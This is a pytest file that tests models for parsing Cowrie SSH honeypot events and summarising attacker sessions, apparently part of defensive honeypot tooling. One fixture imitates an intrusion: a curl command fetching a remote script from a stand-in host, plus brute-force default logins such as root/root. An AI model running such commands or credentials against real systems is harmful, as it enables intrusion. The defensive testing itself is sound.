"""Tests for the event and session models."""

from datetime import UTC, datetime

import pytest
from pydantic import ValidationError

from honeypot_ai.models import (
    Command,
    CowrieEvent,
    EventId,
    FileTransfer,
    LoginAttempt,
    Protocol,
    Session,
)

TS = datetime(2026, 9, 30, 21, 33, 32, tzinfo=UTC)


def test_event_parses_a_login_line() -> None:
    event = CowrieEvent.model_validate(
        {
            "eventid": "cowrie.login.success",
            "timestamp": "2026-09-30T21:33:32.804289Z",
            "session": "4d811ea9aba6",
            "src_ip": "203.0.113.7",
            "username": "root",
            "password": "passwort.112233",
            "message": "login attempt succeeded",
        }
    )
    assert event.known_event is EventId.LOGIN_SUCCESS
    assert event.username == "root"


def test_event_keeps_unknown_fields_and_event_types() -> None:
    """Cowrie adds event types over time; one must not break the rest."""
    event = CowrieEvent.model_validate(
        {
            "eventid": "cowrie.some.future.event",
            "timestamp": "2026-09-30T21:33:32Z",
            "session": "abc",
            "brand_new_field": 42,
        }
    )
    assert event.known_event is None
    assert event.model_extra is not None
    assert event.model_extra["brand_new_field"] == 42


def test_event_rejects_an_empty_eventid() -> None:
    with pytest.raises(ValidationError):
        CowrieEvent.model_validate(
            {"eventid": "", "timestamp": "2026-09-30T21:33:32Z", "session": "abc"}
        )


def test_event_requires_a_session() -> None:
    with pytest.raises(ValidationError):
        CowrieEvent.model_validate(
            {"eventid": "cowrie.login.failed", "timestamp": "2026-09-30T21:33:32Z"}
        )


def test_events_are_immutable() -> None:
    event = CowrieEvent(eventid="cowrie.session.connect", timestamp=TS, session="abc")
    with pytest.raises(ValidationError):
        event.eventid = "changed"


def test_brute_force_session_is_not_authenticated_or_interactive() -> None:
    session = Session(
        session_id="abc",
        src_ip="203.0.113.7",
        started_at=TS,
        login_attempts=(
            LoginAttempt(username="root", password="root", succeeded=False, timestamp=TS),
            LoginAttempt(username="admin", password="admin", succeeded=False, timestamp=TS),
        ),
    )
    assert not session.authenticated
    assert not session.interactive


def test_interactive_session_reports_its_activity() -> None:
    session = Session(
        session_id="abc",
        src_ip="203.0.113.7",
        protocol=Protocol.SSH,
        started_at=TS,
        duration_seconds=12.5,
        login_attempts=(
            LoginAttempt(username="root", password="hunter2", succeeded=True, timestamp=TS),
        ),
        commands=(
            Command(input="uname -a", failed=False, timestamp=TS),
            Command(input="curl http://example.invalid/x.sh", failed=True, timestamp=TS),
        ),
        file_transfers=(
            FileTransfer(
                url="http://example.invalid/x.sh",
                shasum=None,
                uploaded=False,
                timestamp=TS,
            ),
        ),
    )

    assert session.authenticated
    assert session.interactive
    assert session.summary() == {
        "session_id": "abc",
        "src_ip": "203.0.113.7",
        "protocol": "ssh",
        "login_attempts": 1,
        "authenticated": True,
        "commands": 2,
        "file_transfers": 1,
        "duration_seconds": 12.5,
    }


def test_session_defaults_are_empty_not_shared() -> None:
    a = Session(session_id="a", src_ip="203.0.113.1", started_at=TS)
    b = Session(session_id="b", src_ip="203.0.113.2", started_at=TS)
    assert a.commands == () and b.commands == ()
